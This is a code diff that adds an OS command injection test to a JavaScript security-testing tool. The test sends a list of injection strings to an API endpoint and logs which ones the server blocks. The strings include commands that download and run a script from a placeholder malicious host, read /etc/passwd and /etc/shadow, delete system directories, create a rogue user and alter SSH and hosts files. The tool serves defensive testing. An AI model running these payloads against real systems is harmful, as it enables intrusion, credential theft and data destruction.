@@ -430,4 +430,71 @@ maliciousInjectionTest.NoSQL = async (returnToTestMenu) => {
   if (returnToTestMenu) returnToTestMenu();
 };
 
+maliciousInjectionTest.OS = async (returnToTestMenu) => {
+	let successfulCommand = true;
+	const blockedCommands = [];
+	const allowedCommands = [];
+
+	const potentiallyMaliciousOS = [
+		`' ; ls -la'`,
+		`' ; cat /etc/passwd'`,
+		`' ; id'`,
+		`' ; echo "Hello, OS Command Injection!"'`,
+		`' ; rm -rf /'`,
+		`' ; wget malicious-site.com/malware.sh -0 /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'`,
+		`' ; curl -o /tmp/malware.sh malicious-site.com/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh'`,
+		`' ; ping -c 3 malicious-site.com'`,
+		`';$(sleep 5) #'`,
+		`'; $(sleep 5) #'`,
+		`'|| sleep 5 ||'`,
+		`' || sleep 5 || '`,
+		`'; cat /etc/shadow #'`,
+		`'; rm -rf /etc /var #'`,
+		`'; curl -X POST -d "param=value" malicious-site.com'`,
+		`'; wget -0 /dev/null malicious-site.com/data.txt'`,
+		`'; find / -name *.log'`,
+		`'; ps aux'`,
+		`'; netstat -an'`,
+		`'; service apache2 restart'`,
+		`'; useradd malicious-user && echo 'malicious-pass' | passwd --stdin malicious-user'`,
+		`'; iptables -A INPUT -p tcp --dport 12345 -j DROP'`,
+		`'; echo "Malicious payload" > /var/www/html/index.html'`,
+		`'; chmod 777 /'`,
+		`' ; tar -cvzf /tmp/malicious.tar.gz /etc'`,
+		`' ; mv /var/log/syslog /tmp/syslog_backup'`,
+		`' ; echo "Malicious content" >> /etc/hosts'`,
+		`' ; chsh -s /bin/bash malicious-user'`,
+		`' ; sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config'`,
+		`' ; echo "127.0.0.1 malicious-site.com" >> /etc/hosts'`,
+	];
+
+	for (const maliciousCommand of potentiallyMaliciousOS) {
+		await fetch(config.API_URL, {
+			method: 'POST',
+			headers: {
+				'content-type': 'application/json',
+			},
+			body: JSON.stringify({
+				command: maliciousCommand,
+			}),
+		}).then((res) => {
+			if (!res.ok) {
+				successfulCommand = false;
+				blockedCommands.push(maliciousCommand);
+			} else {
+				allowedCommands.push(maliciousCommand + '\n');
+			}
+		});
+	}
+	console.log(
+		underlined(greenBold('\nPotentially malicious queries blocked: \n\n')),
+		blockedCommands
+	);
+	console.log(
+		underlined(redBold('\nPotentially malicious queries allowed: \n\n')),
+		red(allowedCommands)
+	);
+	if (returnToTestMenu) returnToTestMenu();
+};
+
 module.exports = maliciousInjectionTest;
